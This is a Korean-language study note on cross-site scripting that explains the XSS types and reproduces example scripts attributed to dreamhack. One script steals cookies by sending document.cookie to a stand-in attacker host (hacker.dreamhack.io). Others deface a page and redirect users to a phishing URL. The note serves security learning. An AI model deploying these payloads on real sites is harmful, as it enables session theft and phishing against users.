# XSS

XSS는 Cross-site Scripting의 약어이며 SQL injection과 함께 웹 상에서 가장 기초적인 취약점 공격 방법의 일종이다. <br>
공격자가 웹 리소스에 악성 스크립트(ex javascript)를 삽입한 후 이용자가 스크립트를 실행하게 되면 의도치 않은 행동이 수행 되거나 쿠키나 세션등의 민감한 정보가 탈취 될 수 있다.<br>
XSS는 발생 형태에 따라 Stored XSS, Reflected XSS, DOM-based XSS,  Universal XSS로 나뉜다.<br>

* Stored XSS : XSS에 사용되는 악성 스크립트가 서버에 저장되고 서버의 응답에 담겨오는 XSS
* Reflected XSS : XSS에 사용되는 악성 스크립트가 URL에 삽입되고 서버의 응답에 담겨오는 XSS
* DOM-based XSS : XSS에 사용되는 악성 스크립트가 URL Fragment에 삽입되는 XSS
* Universal XSS : 클라이언트의 브라우저 혹은 브라우저의 플러그인에서 발생하는 취약점으로 SOP 정책을 우회하는 XSS

## XSS 스크립트 예시
다음은 dreamhack에서 제공한 XSS스크립트 예시이다.<br>

* 쿠키 및 세션 탈취 공격 코드
```javascript
    <script>
    // "hello" 문자열 alert 실행.
    alert("hello");
    // 현재 페이지의 쿠키(return type: string)
    document.cookie; 
    // 현재 페이지의 쿠키를 인자로 가진 alert 실행.
    alert(document.cookie);
    // 쿠키 생성(key: name, value: test)
    document.cookie = "name=test;";
    // new Image() 는 이미지를 생성하는 함수이며, src는 이미지의 주소를 지정. 공격자 주소는 http://hacker.dreamhack.io
    // "http://hacker.dreamhack.io/?cookie=현재페이지의쿠키" 주소를 요청하기 때문에 공격자 주소로 현재 페이지의 쿠키 요청함
    new Image().src = "http://hacker.dreamhack.io/?cookie=" + document.cookie;
    </script>
```

* 페이지 변조 공격 코드
```javascript
    <script>
    // 이용자의 페이지 정보에 접근.
    document;
    // 이용자의 페이지에 데이터를 삽입.
    document.write("Hacked By DreamHack !");
    </script>
```

* 위치 이동 공격 코드
```javascript
    <script>
    // 이용자의 위치를 변경.
    // 피싱 공격 등으로 사용됨.
    location.href = "http://hacker.dreamhack.io/phishing"; 
    // 새 창 열기
    window.open("http://hacker.dreamhack.io/")
    </script>
```

## Stored XSS
Stored XSS는 서버의 데이터베이스 또는 파일 등의 형태로 저장된 악성 스크립트를 조회할 때 발생하는 XSS이다. <br>
예를 들어, 게시판에 글을 올릴때 악성 스크립트를 포함시켜 작성한다면 그 글을 여는 모든 이용자들이 공격 대상이된다. 

## Reflected XSS
Reflected XSS는 서버가 악성 스크립트가 담긴 요청을 출력할 때 발생한다. <br>
Reflected XSS는 Stored XSS와는 다르게 URL과 같은 이용자의 요청에 의해 발생한다. 따라서 공격을 위해서는 타 이용자에게 악성 스크립트가 포함된 링크에 접속하도록 유도해야 한다. 